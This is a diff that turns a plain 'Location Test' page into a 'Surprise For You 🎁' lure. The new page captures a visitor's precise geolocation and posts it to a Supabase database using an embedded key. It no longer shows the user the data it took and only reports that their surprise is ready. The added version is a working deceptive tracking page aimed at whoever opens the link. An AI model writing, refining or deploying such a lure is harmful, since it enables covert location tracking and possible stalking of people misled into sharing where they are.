@@ -1,103 +1,97 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location Test</title>
-</head>
-
-<body>
-  <h2>Location Test</h2>
-
-  <p>Share your location only if you agree.</p>
-
-  <button onclick="shareLocation()">
-    Share My Location
-  </button>
-
-  <p id="result"></p>
-
-  <script>
-    const SUPABASE_URL =
-      "https://jpwomydvlacrtqxjvtxi.supabase.co";
-
-    const SUPABASE_KEY =
-      "sb_publishable_uLvwcaQlm7HZvTXPBiNUhw_OMgj_7ub";
-
-    const sessionId = crypto.randomUUID();
-
-    function shareLocation() {
-      const result = document.getElementById("result");
-
-      if (!navigator.geolocation) {
-        result.innerText =
-          "Location is not supported by this browser.";
-        return;
-      }
-
-      result.innerText =
-        "Getting your location...";
-
-      navigator.geolocation.getCurrentPosition(
-        async function(position) {
-
-          const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            session_id: sessionId
-          };
-
-          try {
-            const response = await fetch(
-              SUPABASE_URL + "/rest/v1/locations",
-              {
-                method: "POST",
-
-                headers: {
-                  "apikey": SUPABASE_KEY,
-                  "Authorization": "Bearer " + SUPABASE_KEY,
-                  "Content-Type": "application/json",
-                  "Prefer": "return=minimal"
-                },
-
-                body: JSON.stringify(data)
-              }
-            );
-
-            if (!response.ok) {
-              throw new Error(await response.text());
-            }
-
-            result.innerHTML =
-              "Location saved successfully ✅<br><br>" +
-              "Latitude: " + data.latitude + "<br>" +
-              "Longitude: " + data.longitude + "<br>" +
-              "Accuracy: " +
-              Math.round(data.accuracy) +
-              " meters";
-
-          } catch (error) {
-
-            result.innerText =
-              "Database error: " + error.message;
-          }
-        },
-
-        function(error) {
-
-          result.innerText =
-            "Location permission denied or unavailable.";
-        },
-
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    }
-  </script>
-
-</body>
+<!DOCTYPE html>  <html>  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>Surprise For You 🎁</title>  
+</head>  <body>    <h2>Surprise For You 🎁</h2>    <p>  
+    <strong>Click Here →</strong>  
+  </p>    <button onclick="shareLocation()">  
+    Share My Location 📍  
+  </button>    <p id="result"></p>    <script>  
+    const SUPABASE_URL =  
+      "https://jpwomydvlacrtqxjvtxi.supabase.co";  
+  
+    const SUPABASE_KEY =  
+      "sb_publishable_uLvwcaQlm7HZvTXPBiNUhw_OMgj_7ub";  
+  
+    const sessionId = crypto.randomUUID();  
+  
+    function shareLocation() {  
+  
+      const result = document.getElementById("result");  
+  
+      if (!navigator.geolocation) {  
+        result.innerHTML =  
+          "Sorry! 😔<br><br>" +  
+          "Your browser does not support this feature.";  
+        return;  
+      }  
+  
+      result.innerHTML =  
+        "Getting Your Surprise... 🎁<br><br>" +  
+        "Please Wait...";  
+  
+      navigator.geolocation.getCurrentPosition(  
+  
+        async function(position) {  
+  
+          const data = {  
+            latitude: position.coords.latitude,  
+            longitude: position.coords.longitude,  
+            accuracy: position.coords.accuracy,  
+            session_id: sessionId  
+          };  
+  
+          try {  
+  
+            const response = await fetch(  
+              SUPABASE_URL + "/rest/v1/locations",  
+              {  
+                method: "POST",  
+  
+                headers: {  
+                  "apikey": SUPABASE_KEY,  
+                  "Authorization": "Bearer " + SUPABASE_KEY,  
+                  "Content-Type": "application/json",  
+                  "Prefer": "return=minimal"  
+                },  
+  
+                body: JSON.stringify(data)  
+              }  
+            );  
+  
+            if (!response.ok) {  
+              throw new Error("Database request failed");  
+            }  
+  
+            result.innerHTML =  
+              "Your Surprise Is Ready! 🎁✨<br><br>" +  
+              "Thank You! ❤️";  
+  
+          } catch (error) {  
+  
+            result.innerHTML =  
+              "Sorry! 😔<br><br>" +  
+              "Please try again.";  
+  
+          }  
+  
+        },  
+  
+        function(error) {  
+  
+          result.innerHTML =  
+            "Sorry! 😔<br><br>" +  
+            "The request could not be completed.";  
+  
+        },  
+  
+        {  
+          enableHighAccuracy: true,  
+          timeout: 15000,  
+          maximumAge: 0  
+        }  
+      );  
+    }  
+  </script>  </body>  
 </html>
